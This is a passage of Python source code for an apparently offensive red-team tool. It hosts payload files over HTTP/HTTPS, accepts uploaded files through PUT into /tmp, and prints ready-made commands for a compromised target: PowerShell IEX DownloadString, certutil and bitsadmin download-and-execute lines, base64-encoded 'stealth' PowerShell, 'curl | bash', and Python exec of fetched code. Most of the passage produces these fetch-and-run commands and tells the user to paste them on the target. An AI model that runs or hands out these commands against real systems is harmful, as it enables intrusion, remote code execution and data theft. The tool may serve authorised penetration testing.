                    print(f'{indent}{CYAN}├─[Linux /dev/shm - Execute] curl:{END} curl -o /dev/shm/{root_files[i]} {filename_url} && chmod +x /dev/shm/{root_files[i]} && /dev/shm/{root_files[i]}')
                    print(f'{indent}{CYAN}├─[Linux /dev/shm - Download Only] wget:{END} wget -O /dev/shm/{root_files[i]} {filename_url}')
                    print(f'{indent}{CYAN}├─[Linux /dev/shm - Download Only] curl:{END} curl -o /dev/shm/{root_files[i]} {filename_url}')
                    print(f'{indent}{CYAN}├─[Linux /tmp - Download Only] wget:{END} wget -O /tmp/{root_files[i]} {filename_url}')
                    print(f'{indent}{CYAN}├─[Linux /tmp - Download Only] curl:{END} curl -o /tmp/{root_files[i]} {filename_url}')
                    print(f'{indent}{CYAN}├─[Cross-Platform - Memory Execute] PowerShell IEX:{END} (New-Object Net.WebClient).DownloadString(\'{filename_url}\') | IEX')
                    print(f'{indent}{CYAN}└─[Cross-Platform - Memory Execute] Python:{END} python3 -c "import urllib.request; exec(urllib.request.urlopen(\'{filename_url}\').read())"')
            else:
                for kword in keywords:
                    if re.search(kword.lower(), root_files[i].lower()):
                        prefix = depth + child if (i < (total_files + total_dirs) - 1) else depth + child_last
                        print(prefix + filename_display)
                        
                        if args.show_commands:
                            indent = depth + '    '
                            print(f'{indent}{RED}├─[CLASSIC IEX]:{END} {iex_classic}')
                            print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Execute] PowerShell:{END} (New-Object Net.WebClient).DownloadFile(\'{filename_url}\', \'C:\\\\Windows\\\\Tasks\\\\{root_files[i]}\'); Start-Process \'C:\\\\Windows\\\\Tasks\\\\{root_files[i]}\'')
                            print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Execute] certutil:{END} certutil -urlcache -f {filename_url} C:\\Windows\\Tasks\\{root_files[i]} && C:\\Windows\\Tasks\\{root_files[i]}')
                            print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Download Only] PowerShell:{END} (New-Object Net.WebClient).DownloadFile(\'{filename_url}\', \'C:\\\\Windows\\\\Tasks\\\\{root_files[i]}\')')
                            print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Download Only] certutil:{END} certutil -urlcache -f {filename_url} C:\\Windows\\Tasks\\{root_files[i]}')
                            print(f'{indent}{CYAN}├─[Windows C:\\Windows\\Tasks - Download Only] IWR:{END} IWR -Uri {filename_url} -OutFile C:\\Windows\\Tasks\\{root_files[i]}')
                            print(f'{indent}{CYAN}├─[Windows - EncodedCommand - IEX] (Stealth):{END} {encoded_iex}')
                            print(f'{indent}{CYAN}├─[Windows - EncodedCommand - Download Only] (Stealth):{END} {encoded_download}')
                            print(f'{indent}{CYAN}├─[Windows - EncodedCommand - Download & Execute] (Stealth):{END} {encoded_execute}')
                            print(f'{indent}{CYAN}├─[Linux /dev/shm - Execute] wget:{END} wget -O /dev/shm/{root_files[i]} {filename_url} && chmod +x /dev/shm/{root_files[i]} && /dev/shm/{root_files[i]}')
                            print(f'{indent}{CYAN}├─[Linux /dev/shm - Execute] curl:{END} curl -o /dev/shm/{root_files[i]} {filename_url} && chmod +x /dev/shm/{root_files[i]} && /dev/shm/{root_files[i]}')
                            print(f'{indent}{CYAN}├─[Linux /dev/shm - Download Only] wget:{END} wget -O /dev/shm/{root_files[i]} {filename_url}')
                            print(f'{indent}{CYAN}├─[Linux /dev/shm - Download Only] curl:{END} curl -o /dev/shm/{root_files[i]} {filename_url}')
                            print(f'{indent}{CYAN}├─[Linux /tmp - Download Only] wget:{END} wget -O /tmp/{root_files[i]} {filename_url}')
                            print(f'{indent}{CYAN}├─[Linux /tmp - Download Only] curl:{END} curl -o /tmp/{root_files[i]} {filename_url}')
                            print(f'{indent}{CYAN}├─[Cross-Platform - Memory Execute] PowerShell IEX:{END} (New-Object Net.WebClient).DownloadString(\'{filename_url}\') | IEX')
                            print(f'{indent}{CYAN}└─[Cross-Platform - Memory Execute] Python:{END} python3 -c "import urllib.request; exec(urllib.request.urlopen(\'{filename_url}\').read())"')
                        break

        # Process dirs
        root_dirs.sort()
        
        for i in range(0, total_dirs):
            if root_dirs[i] in hide_dirs:
                continue
            
            joined_path = root_dir + root_dirs[i]
            is_recursive = False
            directory = (root_dirs[i] + os.sep)
            
            # Access permissions check
            try:
                sub_dirs = len(next(os.walk(joined_path))[1])
                sub_files = len(next(os.walk(joined_path))[2])
                errormsg = ''
            except StopIteration:
                sub_dirs, sub_files = 0, 0
                errormsg = ' [error accessing dir]'
            
            # Check if symlink and if target leads to recursion
            if root_dirs[i] in symlinks:
                symlink_target = target = os.readlink(joined_path)
                target = fake2realpath(root_dir, target)
                is_recursive = ' [recursive, not followed]' if target == root_dir[0:-1] else ''
                
                if len(is_recursive):
                    recursive.append(joined_path)
                    
                print(depth + child + LINK + directory + END + ' -> ' + DIR + symlink_target + END + is_recursive + errormsg) if i < total_dirs - 1 \
                else print(depth + child_last + LINK + directory + END + ' -> ' + DIR + symlink_target + END + is_recursive + errormsg)
            else:
                print(depth + child + DIR + directory + END + errormsg) if i < total_dirs - 1 \
                else print(depth + child_last + DIR + directory + END + errormsg)

            # Iterate next dir
            if (not follow_links and root_dirs[i] not in symlinks) or (follow_links and not is_recursive):
                if (sub_dirs or sub_files) and (intent + 1) < depth_level:
                    tmp = depth
                    depth = depth + parent if i < (total_dirs - 1) else depth + '	'
                    wwwtree(joined_path + os.sep, intent + 1, depth)
                    depth = tmp
            
    except StopIteration:
        print('\r' + DIR + root_dir + END + ' [error accessing dir]')
    except UnicodeEncodeError:
        adjustUnicodeError()
    except KeyboardInterrupt:
        exit_with_msg('Keyboard interrupt.')
    except Exception as e:
        exit_with_msg('Something went wrong. Consider creating an issue.\n' + BOLD + 'Error Details' + END +': ' + str(e))

# -------------- HTTP Server with Red Team Features -------------- #
class HTTPRequestHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            # Check if requesting HTML index
            if self.path == '/' and args.html_index:
                html_content = generate_html_index()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(html_content.encode())
                return
            
            # Also handle /index.html
            if self.path == '/index.html' and args.html_index:
                html_content = generate_html_index()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(html_content.encode())
                return
            
            # Normal file request
            requested_path = args.root_path + self.path
            if os.path.exists(requested_path) and not os.path.isdir(requested_path):
                # Log the download
                filename = os.path.basename(requested_path)
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                log_download(client_ip, filename, user_agent)
                
                requested_resource = open(requested_path, 'rb')
                data = requested_resource.read()
                requested_resource.close()
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(data)
                self.connection.close()
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'NOT FOUND')
                
        except Exception as e:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'NOT FOUND')
        
    def do_PUT(self):
        resource = urllib.parse.unquote(self.path).split("/")[-1]
        
        if resource.endswith('/') or not resource:
            self.send_response(400)
            self.end_headers()
            self.wfile.write("You need to provide a file name to write in.\n".encode())
            return
        else:
            try:
                file_path = '/tmp/' + resource
                file_path = (file_path + '_' + uuid4().hex[0:6]) if os.path.exists('/tmp/' + resource) else file_path
                            
                length = int(self.headers['Content-Length'])
                content = self.rfile.read(length)
                 
                with open(file_path, 'wb') as f:
                    f.write(content)
                    
                self.send_response(201, "Created")
                self.end_headers()
                self.wfile.write("File received.\n".encode())
                
                client_ip = self.client_address[0]
                print(f'[{INFO}] {client_ip} uploaded {resource} -> {file_path}')
                
            except Exception as e:
                print(f'[{INFO}] Last received PUT request failed: {e}')
                pass
            
    def log_message(self, format, *args):
        # Override to prevent default logging
        pass

def generate_webtree(path):
    root_dir = path if path[-1] == os.sep else path + os.sep
    if os.path.exists(root_dir):
        wwwtree(root_dir)
    else:
        exit_with_msg('Directory does not exist.')

def list_payloads():
    """Clean, organized payload listing with quick reference commands"""
    
    # Header
    print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════════════════╗{END}")
    print(f"{BOLD}{CYAN}║                    AVAILABLE PAYLOADS - QUICK REFERENCE                  ║{END}")
    print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════════════════════════════╝{END}\n")
    
    # Collect payload files
    payload_files = []
    for root, dirs, files in os.walk(args.root_path):
        for file in files:
            # Skip files with common non-payload extensions
            skip_exts = ['.txt', '.log', '.md', '.yml', '.yaml', '.json', '.xml', '.html', '.css', 
                        '.js', '.jpg', '.png', '.gif', '.bmp', '.ico', '.pdf', '.doc', '.docx', 
                        '.xls', '.xlsx', '.zip', '.tar', '.gz', '.rar', '.7z']
            if any(file.lower().endswith(ext) for ext in skip_exts):
                continue
            payload_files.append(file)
    
    if not payload_files:
        print(f"{RED}No payload files found in {args.root_path}{END}")
        print(f"   {YELLOW}Tip: Make sure your payload files have extensions like .ps1, .py, .sh, .bat, .exe{END}")
        return
    
    # Sort files
    payload_files.sort()
    
    # Show summary
    print(f"{GREEN}Found {len(payload_files)} payload file(s){END}")
    print(f"   Server: {ORANGE}http://{lhost}:{server_port}/{END}\n")
    
    # Show each payload with its commands
    for i, file in enumerate(payload_files, 1):
        url = f'http://{lhost}:{server_port}/{file}'
        
        # File header
        print(f"{YELLOW}┌─ [{i}] {BOLD}{file}{END}")
        print(f"{YELLOW}│{END}")
        
        # ============ CLASSIC IEX ============
        iex_classic = generate_iex_command(file, url)
        print(f"{YELLOW}│{END}  {RED}CLASSIC IEX ( Style){END}")
        print(f"{YELLOW}│{END}    {iex_classic}")
        print(f"{YELLOW}│{END}")
        
        # ============ WINDOWS - POWERSHELL ============
        print(f"{YELLOW}│{END}  {CYAN}Windows - PowerShell{END}")
        print(f"{YELLOW}│{END}    {GREEN}Memory Execute (IEX):{END}")
        print(f"{YELLOW}│{END}      powershell -c \"iex (New-Object Net.WebClient).DownloadString('{url}')\"")
        print(f"{YELLOW}│{END}    {GREEN}Download + Execute (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      powershell -c \"(New-Object Net.WebClient).DownloadFile('{url}', 'C:\\Windows\\Tasks\\{file}'); Start-Process 'C:\\Windows\\Tasks\\{file}'\"")
        print(f"{YELLOW}│{END}    {GREEN}Download Only (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      powershell -c \"(New-Object Net.WebClient).DownloadFile('{url}', 'C:\\Windows\\Tasks\\{file}')\"")
        print(f"{YELLOW}│{END}    {GREEN}IWR (wget-like):{END}")
        print(f"{YELLOW}│{END}      powershell -c \"iwr -Uri {url} -OutFile C:\\Windows\\Tasks\\{file}; & C:\\Windows\\Tasks\\{file}\"")
        print(f"{YELLOW}│{END}")
        
        # ============ WINDOWS - CMD / OTHER ============
        print(f"{YELLOW}│{END}  {CYAN}Windows - CMD/Other{END}")
        print(f"{YELLOW}│{END}    {GREEN}CertUtil Download+Execute (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      certutil -urlcache -f {url} C:\\Windows\\Tasks\\{file} && C:\\Windows\\Tasks\\{file}")
        print(f"{YELLOW}│{END}    {GREEN}CertUtil Download Only (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      certutil -urlcache -f {url} C:\\Windows\\Tasks\\{file}")
        print(f"{YELLOW}│{END}    {GREEN}BitsAdmin Download+Execute (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      bitsadmin /transfer myjob /download /priority high {url} C:\\Windows\\Tasks\\{file} && C:\\Windows\\Tasks\\{file}")
        print(f"{YELLOW}│{END}")
        
        # ============ WINDOWS - ENCODED (FULL) ============
        encoded_iex = generate_encoded_command(url)
        encoded_download = generate_encoded_download_command(url, f'C:\\Windows\\Tasks\\{file}')
        encoded_execute = generate_encoded_download_execute_command(file, lhost, server_port)
        
        print(f"{YELLOW}│{END}  {CYAN}Windows - Encoded Commands (Stealth){END}")
        print(f"{YELLOW}│{END}    {GREEN}Encoded IEX:{END}")
        print(f"{YELLOW}│{END}      {encoded_iex}")
        print(f"{YELLOW}│{END}    {GREEN}Encoded Download Only (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      {encoded_download}")
        print(f"{YELLOW}│{END}    {GREEN}Encoded Download+Execute (C:\\Windows\\Tasks):{END}")
        print(f"{YELLOW}│{END}      {encoded_execute}")
        print(f"{YELLOW}│{END}")
        
        # ============ LINUX ============
        print(f"{YELLOW}│{END}  {CYAN}Linux (/dev/shm){END}")
        print(f"{YELLOW}│{END}    {GREEN}Memory Execute (curl):{END}")
        print(f"{YELLOW}│{END}      curl -s {url} | bash")
        print(f"{YELLOW}│{END}    {GREEN}Memory Execute (wget):{END}")
        print(f"{YELLOW}│{END}      wget -qO- {url} | bash")
        print(f"{YELLOW}│{END}    {GREEN}Download + Execute (/dev/shm):{END}")
        print(f"{YELLOW}│{END}      wget -O /dev/shm/{file} {url} && chmod +x /dev/shm/{file} && /dev/shm/{file}")
        print(f"{YELLOW}│{END}    {GREEN}Download Only (/dev/shm):{END}")
        print(f"{YELLOW}│{END}      wget -O /dev/shm/{file} {url}")
        print(f"{YELLOW}│{END}    {GREEN}Download Only (/tmp):{END}")
        print(f"{YELLOW}│{END}      wget -O /tmp/{file} {url}")
        print(f"{YELLOW}│{END}")
        
        # ============ PYTHON (CROSS-PLATFORM) ============
        print(f"{YELLOW}│{END}  {CYAN}Python (Cross-Platform){END}")
        print(f"{YELLOW}│{END}    {GREEN}Memory Execute:{END}")
        print(f"{YELLOW}│{END}      python3 -c \"import urllib.request; exec(urllib.request.urlopen('{url}').read())\"")
        print(f"{YELLOW}│{END}    {GREEN}Download Only:{END}")
        print(f"{YELLOW}│{END}      python3 -c \"import urllib.request; urllib.request.urlretrieve('{url}', '{file}')\"")
        
        # Separator
        if i < len(payload_files):
            print(f"{YELLOW}│{END}")
            print(f"{YELLOW}├───────────────────────────────────────────────────────────────────────────{END}")
            print(f"{YELLOW}│{END}")
    
    # Footer with additional tips
    print(f"{YELLOW}└───────────────────────────────────────────────────────────────────────────{END}\n")

def main(path, bind_address = '0.0.0.0', bind_port = server_port):
    # Handle single command generation
    if args.get_ps:
        print(generate_ps_iex_execute(args.get_ps, lhost, server_port))
        _exit(0)
    
    if args.get_bash:
        print(generate_wget_execute_linux(args.get_bash, lhost, server_port))
        _exit(0)
    
    if args.get_iex:
        url = f'http://{lhost}:{server_port}/{args.get_iex}'
        print(generate_iex_command(args.get_iex, url))
        _exit(0)
    
    try:
        httpd = HTTPServer((bind_address, bind_port), HTTPRequestHandler)
        
        # Add HTTPS support if certificate provided
        if args.cert and args.key:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(args.cert, args.key)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            protocol = "HTTPS"
        else:
            protocol = "HTTP"
            
    except OSError:
        exit_with_msg(f'Port {bind_port} seems to already be in use.\n')
    
    httpd_thread = Thread(target = httpd.serve_forever, args=())
    httpd_thread.daemon = True
    httpd_thread.start()
    
    print_banner() if not args.quiet else move_on()
    
    # ============ SHOW PAYLOAD LIST BY DEFAULT ============
    list_payloads()
    
    print(f'[{INFO}] {protocol} server listening on {ORANGE}{bind_address}{END}:{ORANGE}{bind_port}{END}')
    print(f'[{INFO}] Interface address: {ORANGE}{lhost}{END}')
    print(f'[{INFO}] Root path: {ORANGE}{args.root_path}{END}')
    
    # Show hosting message
    payload_files = []
    for root, dirs, files in os.walk(args.root_path):
        for file in files:
            skip_exts = ['.txt', '.log', '.md', '.yml', '.yaml', '.json', '.xml', '.html', '.css', 
                        '.js', '.jpg', '.png', '.gif', '.bmp', '.ico', '.pdf', '.doc', '.docx', 
                        '.xls', '.xlsx', '.zip', '.tar', '.gz', '.rar', '.7z']
            if not any(file.lower().endswith(ext) for ext in skip_exts):
                payload_files.append(file)
    
    print(f'[{INFO}] {GREEN}Hosting {len(payload_files)} payload files{END}')
    print(f'[{INFO}] {GREEN}Payload URL: {ORANGE}http://{lhost}:{bind_port}/<filename>{END}')
    print(f'[{INFO}] {GREEN}Classic IEX command: (New-Object Net.WebClient).DownloadString(\'http://{lhost}:{bind_port}/<filename>\') | IEX{END}')
    print(f'[{INFO}] {GREEN}Copy any command above and paste it on the target{END}')
    
    if args.html_index:
        print(f'[{INFO}] HTML index available at: {ORANGE}http://{lhost}:{bind_port}/{END}')
        print(f'[{INFO}] {GREEN}Visit {ORANGE}http://{lhost}:{bind_port}/{END} in your browser{END}')
    
    if args.show_commands:
        print(f'[{INFO}] {GREEN}Showing ALL download commands for EVERY file in the tree{END}')
        print(f'[{INFO}] Command categories: Classic IEX, Windows Execute, Windows Download Only, Windows EncodedCommand (Stealth), Linux Execute, Linux Download Only, Cross-Platform{END}')
    
    print(f'[{INFO}] Press ENTER to exit.\n')
    
    generate_webtree(path)
    print(f'\n------- {ORANGE}Server Access Log{END} -------')
    print(f'[{INFO}] Tracking downloads' + (f" to {args.log_file}" if args.log_file else ""))
    
    try:
        inp = input()
        _exit(0)
    except KeyboardInterrupt:
        _exit(0)

if __name__ == '__main__':
    main(args.root_path)
